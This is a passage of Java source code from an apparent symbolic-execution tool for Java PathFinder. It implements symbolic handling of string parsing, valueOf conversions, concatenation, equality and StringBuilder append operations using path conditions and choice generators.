		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			IntegerExpression result = null;
			ChoiceGenerator<?> cg;
			boolean conditionValue;
			cg = th.getVM().getChoiceGenerator();

			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

			sf.pop();
			PathCondition pc;
			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null)
				pc = new PathCondition();
			else
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

			assert pc != null;

			if (conditionValue) {
				pc.spc._addDet(StringComparator.ISINTEGER, (StringExpression) sym_v3);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					result = ((StringExpression) sym_v3)._IvalueOf();
					sf.push(0, false); /* Result is don't care and an int */
					sf = th.getModifiableTopFrame();
					sf.setOperandAttr(result);
				}
			} else {
				pc.spc._addDet(StringComparator.NOTINTEGER, (StringExpression) sym_v3);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					th.createAndThrowException(""java.lang.NumberFormatException"");
//					throw new RuntimeException(""ERROR: Integer Format Type Exception"");
//					//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
//					//sf.push(0, true);
				}
			}
		}

	}

	public void handleParseFloat(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			RealExpression result = null;
			ChoiceGenerator<?> cg;
			boolean conditionValue;
			cg = th.getVM().getChoiceGenerator();

			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

			sf.pop();
			PathCondition pc;
			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null)
				pc = new PathCondition();
			else
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

			assert pc != null;
			if (conditionValue) {
				pc.spc._addDet(StringComparator.ISFLOAT, (StringExpression) sym_v3);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					result = ((StringExpression) sym_v3)._RvalueOf();
					sf.push(0, false); /* Result is don't care and a float */
					sf = th.getModifiableTopFrame();
					sf.setOperandAttr(result);
				}
			} else {
				pc.spc._addDet(StringComparator.NOTFLOAT, (StringExpression) sym_v3);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					throw new RuntimeException(""ERROR: Possible Float Format Type Exception - Path Terminated"");
					
					//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
				}
			}
		}

	}

	public void handleParseFloatValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof RealExpression) {
				RealExpression sym_v2 = (RealExpression) sym_v3;
				sf.pop();
				int objRef = getNewObjRef(invInst, th); /* dummy Float Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				RealExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;
				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;
				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISFLOAT, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._RvalueOf();
						int objRef = getNewObjRef(invInst, th); /* dummy Float Object */
						sf.push(objRef, true);
						sf = th.getModifiableTopFrame();
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTFLOAT, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Possible Float Format Type Exception - Path Terminated"");
						
						//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
					}
				}
			}
		}

	}

	public void handleParseDoubleValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof RealExpression) {
				RealExpression sym_v2 = (RealExpression) sym_v3;
				sf.popLong();
				int objRef = getNewObjRef(invInst, th); /* dummy Double Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				RealExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;
				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISDOUBLE, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._RvalueOf();
						int objRef = getNewObjRef(invInst, th); /* dummy Double Object */
						sf.push(objRef, true);
						sf = th.getModifiableTopFrame();
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTDOUBLE, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Double Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true);
						//sf.push(0, true); // TODO: to review
					}
				}
			}
		}

	}

	public void handleParseDouble(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof RealExpression) {
				return;
			} else {
				StringExpression sym_v1 = (StringExpression) sym_v3;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;
				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISDOUBLE, sym_v1);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						RealExpression sym_v2 = new SpecialRealExpression(sym_v1);
						sf.pushLong((long) 0); /* Result is don't care and 0 */
						//sf = th.getModifiableTopFrame(); ??
						sf.setLongOperandAttr(sym_v2);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTDOUBLE, sym_v1);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Double Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
					}
				}
			}
		}
	}

	public void handleParseLong(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				return;
			} else {
				StringExpression sym_v1 = (StringExpression) sym_v3;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;
				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISLONG, sym_v1);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						IntegerExpression sym_v2 = new SpecialIntegerExpression(sym_v1);
						sf.pushLong((long) 0); /* result is don't care */
						//sf = th.getModifiableTopFrame(); ??
						sf.setLongOperandAttr(sym_v2);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTLONG, sym_v1);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Long Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
					}
				}
			}
		}
	}

	public void handleParseBoolean(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			ChoiceGenerator<?> cg;
			boolean conditionValue;
			cg = th.getVM().getChoiceGenerator();

			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;
			sf.pop();
			PathCondition pc;

			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null)
				pc = new PathCondition();
			else
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

			assert pc != null;

			if (conditionValue) {
				pc.spc._addDet(StringComparator.ISBOOLEAN, sym_v1);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					IntegerExpression sym_v2 = new SpecialIntegerExpression(sym_v1);
					sf.push(0, false); /* result is don't care and 0 */
					sf = th.getModifiableTopFrame();
					sf.setOperandAttr(sym_v2);
				}
			} else {
				pc.spc._addDet(StringComparator.NOTBOOLEAN, sym_v1);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					throw new RuntimeException(""ERROR: Boolean Format Type Exception"");
					//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
				}
			}
		}
	}

	public int getNewObjRef(JVMInvokeInstruction invInst, ThreadInfo th) {
		
		//DynamicArea da = th.getVM().getDynamicArea();
		MethodInfo mi = invInst.getInvokedMethod();
		ClassInfo ci = ClassLoaderInfo.getCurrentResolvedClassInfo(mi.getReturnTypeName());
		ElementInfo objRef = th.getHeap().newObject(ci, th);
		return objRef.getObjectRef();
	}

	// works for BigDecimal
	public Instruction getBigDecimalValue(JVMInvokeInstruction invInst, ThreadInfo th) {
		MethodInfo mi = invInst.getInvokedMethod();
		ClassInfo ci = mi.getClassInfo();
		MethodInfo miInit = ci.getMethod(""toString()V"", false);
		if (miInit == null) {
			return null;
		}
		//Instruction initPC = miInit.execute(th);
		//return initPC;
		throw new RuntimeException(""not handled; to review"");
	}

	// works for String, StringBuilder, StringBuffer
	public Instruction init1NewStringObjRef(JVMInvokeInstruction invInst, ThreadInfo th) {
		MethodInfo mi = invInst.getInvokedMethod();
		ClassInfo ci = mi.getClassInfo();
		MethodInfo miInit = ci.getMethod(""<init>()V"", false);
		if (miInit == null) {
			return null;
		}
		//Instruction initPC = miInit.execute(th); // TODO: to review
		//return initPC;
		throw new RuntimeException(""not handled; to review"");
	}

	public Instruction handleIntValueOf(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleIntValueOf"");
		} else {
			sf.pop();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); 
			/*
			 * dummy
			 * string
			 * Object
			 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}
		return null;
	}

	public Instruction handleFloatValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		RealExpression sym_v1 = (RealExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleFloatValueOf"");
		} else {
			sf.pop();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * string
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}
		return null;
	}

	public Instruction handleLongValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleLongValueOf"");
		} else {
			sf.popLong();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * string
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}
		return null;
	}

	public Instruction handleDoubleValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		RealExpression sym_v1 = (RealExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleDoubleValueOf"");
		} else {
			sf.popLong();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * string
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}
		return null;
	}

	public Instruction handleBooleanValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleBooleanValueOf"");
		} else {
			sf.pop();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * string
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}
		return null;
	}

	public Instruction handleCharValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		//throw new RuntimeException(""ERROR: symbolic string method not Implemented - CharValueOf"");
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleIntValueOf"");
		} else {
			sf.pop();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef();
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}

		return null;
	}

	public Instruction handleCharArrayValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		throw new RuntimeException(""ERROR: symbolic string method not Implemented - CharArrayValueof"");
	}

	public Instruction handleObjectValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v1 = (Expression) sf.getOperandAttr(0);
		if (sym_v1 instanceof SymbolicStringBuilder) {
			sf.pop();
			SymbolicStringBuilder sym_v3 = (SymbolicStringBuilder) sym_v1;
			StringExpression sym_v2 = StringExpression._valueOf((StringExpression) sym_v3.getstr());
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		} else if (sym_v1 instanceof StringExpression) {
			sf.pop();
			StringExpression sym_v2 = StringExpression._valueOf((StringExpression) sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		} else {
			throw new RuntimeException(""ERROR: symbolic string method not Implemented - ObjectValueof"");
		}
		return null;
	}

	public Instruction handleConcat(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);

		if ((sym_v1 == null) & (sym_v2 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: handleConcat"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();

			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				ElementInfo e1 = th.getElementInfo(s1);
				String val = e1.asString();
				result = sym_v2._concat(val);
			} else if (sym_v2 == null) { // operand 1 is concrete
				ElementInfo e2 = th.getElementInfo(s2);
				String val = e2.asString();
				sym_v2 = new StringConstant(val);
				result = sym_v2._concat(sym_v1);
			} else { // both operands are symbolic
				result = sym_v2._concat(sym_v1);
			}
			int objRef = th.getHeap().newString("""", th).getObjectRef(); 
			/*
			* dummy
			* String
			* Object
			*/
			sf.push(objRef, true);
			sf.setOperandAttr(result);
		}
		return null;
	}

	public void handleObjectEquals(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v1 = (Expression) sf.getOperandAttr(0);
		Expression sym_v2 = (Expression) sf.getOperandAttr(1);

		if (sym_v1 != null) {
			// System.out.println(""*"" + sym_v1.toString());
			if (!(sym_v1 instanceof StringExpression)) {
				throw new RuntimeException(""ERROR: expressiontype not handled: ObjectEquals"");
			}
		}

		if (sym_v2 != null) {
			// System.out.println(""***"" + sym_v2.toString());
			if (!(sym_v2 instanceof StringExpression)) {
				throw new RuntimeException(""ERROR: expressiontype not handled: ObjectEquals"");
			}
		}

		handleEquals(invInst, th);
	}

	public void handleEquals(JVMInvokeInstruction invInst,  ThreadInfo th) {
		handleBooleanStringInstructions(invInst,  th, StringComparator.EQUALS);
		
	}

	public Instruction handleAppend(JVMInvokeInstruction invInst, ThreadInfo th) {
		Instruction handled = null;
		
		MethodInfo mi = invInst.getInvokedMethod(th);
		String[] argTypes = mi.getArgumentTypeNames();
		// System.out.println(argTypes[0]);
		
		boolean isCharSequence = false;
		//check what is the concrete type of the charsequence
		if(argTypes[0].equals(""java.lang.CharSequence"")) {
			isCharSequence = true;
			StackFrame sf = th.getModifiableTopFrame();
			int firstParamIndex = mi.isStatic() ? 0 : 1;
			Object firstParam = sf.getArgumentAttrs(mi)[firstParamIndex]; 
			if(firstParam instanceof StringExpression || firstParam == null /*possibly an string constant*/) {
				argTypes[0] = ""java.lang.String"";
			} else if (firstParam instanceof SymbolicStringBuilder) {
				//TODO and if it is a StringBuffer?
				argTypes[0] = ""java.lang.StringBuilder""; 
			} else {
				throw new RuntimeException(""Unhandled CharSequence at Symbolic String Append; concrete type is:"" + firstParam.getClass());
			}
		}
		if (isCharSequence && argTypes.length == 3) { //append(charSequence,int,int)
			if(argTypes[0].equals(""java.lang.String"")) {
				handled = handleStringAppend3(invInst, th);
			} else { //stringbuilder
				handled = handleStringBuilderAppend3(invInst, th);
			}
		} else if (argTypes[0].equals(""java.lang.String"")) {
			handleStringAppend(invInst, th);
		} else if ((argTypes[0].equals(""java.lang.StringBuilder"")) || (argTypes[0].equals(""java.lang.StringBuffer""))) {
			handleStringBuilderAppend(invInst, th);
		} else if (argTypes[0].equals(""int"")) {
			handleIntAppend(invInst, th);
		} else if (argTypes[0].equals(""char"")) {
			handleCharAppend(invInst, th);
		} else if (argTypes[0].equals(""byte"")) {
			handleByteAppend(invInst, th);
		} else if (argTypes[0].equals(""short"")) {
			handleShortAppend(invInst, th);
		} else if (argTypes[0].equals(""float"")) {
			handleFloatAppend(invInst, th);
		} else if (argTypes[0].equals(""long"")) {
			handleLongAppend(invInst, th);
		} else if (argTypes[0].equals(""double"")) {
			handleDoubleAppend(invInst, th);
		} else if (argTypes[0].equals(""boolean"")) {
			handleBooleanAppend(invInst, th);
		} else if (argTypes[0].equals(""java.lang.Object"")) {
			handleObjectAppend(invInst, th);
		} else {
			throw new RuntimeException(""ERROR: Input parameter type not handled in Symbolic String Append"");
		}

		return handled;
	}

	public void handleStringAppend(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		// int objRef = sf.getThis();
		// ElementInfo ei = th.getElementInfo(objRef);

		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: handleStringAppend"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();

			if (sym_v1 == null) { // operand 0 is concrete
				ElementInfo e1 = th.getElementInfo(s1);
				String val = e1.asString();
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				// setVariableAttribute(ei, invInst, th, sf, s2, sym_v2); //set the
				// value of the attribute of local StringBuilder element as sym_v2
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}
	
	public Instruction handleStringAppend3(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		
		IntegerExpression sym_end = (IntegerExpression) sf.getOperandAttr(0);
		IntegerExpression sym_start = (IntegerExpression) sf.getOperandAttr(1);
		StringExpression sym_string = (StringExpression) sf.getOperandAttr(2);
		SymbolicStringBuilder sym_builder = (SymbolicStringBuilder) sf.getOperandAttr(3);

		if (sym_builder == null) {
			sym_builder = new SymbolicStringBuilder();
		}
		
		//check if all parameters are concrete
		boolean concreteSubstring = (sym_end == null & sym_start == null & sym_string == null);
		
		if (concreteSubstring & sym_builder.getstr() == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleStringAppend3"");
		} else {
			int endRef = sf.pop();
			int startRef = sf.pop();
			int stringRef = sf.pop();
			int builderRef = sf.pop();
	
			//prepare the substring
			StringExpression substring;
			if(concreteSubstring) {
				try {
					ElementInfo eiString = th.getElementInfo(stringRef);
					String concreteString = eiString.asString();
					String slice = concreteString.substring(startRef, endRef);
					substring = new StringConstant(slice);
				} catch (IndexOutOfBoundsException e) {
					return th.createAndThrowException(""java.lang.IndexOutOfBoundsException"",e.getMessage());
				}
			} else {
				if(sym_string == null) { 
					ElementInfo eString = th.getElementInfo(stringRef);
					String concreteString = eString.asString();
					sym_string = new StringConstant(concreteString);
				}
				substring = createSymbolicSubstring(sym_string, sym_start, sym_end, startRef, endRef);
			}
			
			//append to the symbolic string
			if(sym_builder.getstr() == null) { //stringbuilder is concrete 
				ElementInfo eiBuilder = th.getElementInfo(builderRef);
				String builderContents = getStringEquiv(eiBuilder);
				sym_builder.putstr(new StringConstant(builderContents));
			}
			
			sym_builder._append(substring);
			sf.push(builderRef,true); 
		}
		
		sf.setOperandAttr(sym_builder);
		
		return null;
	}
	
	//helper
	private StringExpression createSymbolicSubstring(StringExpression sym_str,
			IntegerExpression sym_start, IntegerExpression sym_end,
			int startRef, int endRef) {
		
		StringExpression result;
		
		//'end' is the first parameter (something with stack representation, maybe?) 
		if(sym_start == null && sym_end == null) { 
			result = sym_str._subString(endRef, startRef);
		} else if (sym_start == null) {
			result = sym_str._subString(sym_end, startRef);
		} else { //sym_end == null
			result = sym_str._subString(endRef, sym_start);
		}
		
		return result;
	}
	
	public Instruction handleStringBuilderAppend3(JVMInvokeInstruction invInst, ThreadInfo th) {
		throw new RuntimeException(""implement this"");
	}

	public void setVariableAttribute(ElementInfo ei, JVMInvokeInstruction invInst, ThreadInfo th, StackFrame sf, int idx,
			Object sym_v2) {
		int count = sf.getLocalVariableCount();
		for (int i = 0; i < count; i++) {
			int idx1 = sf.getLocalVariable(i);
			if (idx1 == idx) {
				sf.setLocalAttr(i, sym_v2);
				return;
			}
		}
		// If variable is a static field and not local variable
		ClassInfo ci = sf.getClassInfo();
		FieldInfo[] fields = ci.getDeclaredStaticFields();
		int fieldid = -1;
		for (int i = 0; i < fields.length; i++) {
			if (fields[i].isReference()) {
				fieldid = ci.getStaticElementInfo().getReferenceField(fields[i]);
			}
			if (fieldid == idx) {
				ci.getStaticElementInfo().setFieldAttr(fields[i], sym_v2);
				return;
			}
		}

		// If variable is an instance field and not local variable
		FieldInfo[] fields1 = ci.getDeclaredInstanceFields();
		fieldid = -1;
		for (int i = 0; i < fields1.length; i++) {
			if (fields1[i].isReference()) {
				fieldid = ei.getReferenceField(fields1[i]);
			}
			if (fieldid == idx) {
				ei.setFieldAttr(fields1[i], sym_v2);
				return;
			}
		}
		// if method does not return anything then
		MethodInfo mi = invInst.getInvokedMethod();
		byte b = mi.getReturnTypeCode();
		if (b == Types.T_VOID)
			System.out.println(""WARNING: Could not set variable attribute"");

	}

	public void handleCharAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: handleCharAppend"");
		} else {
			char s1 = (char) sf.pop();
			int s2 = sf.pop();
			if (sym_v1 == null) { // operand 0 is concrete
				String val = Character.toString(s1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleByteAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: handleByteAppend"");
		} else {
			byte s1 = (byte) sf.pop();
			int s2 = sf.pop();
			if (sym_v1 == null) { // operand 0 is concrete
				String val = Byte.toString(s1);
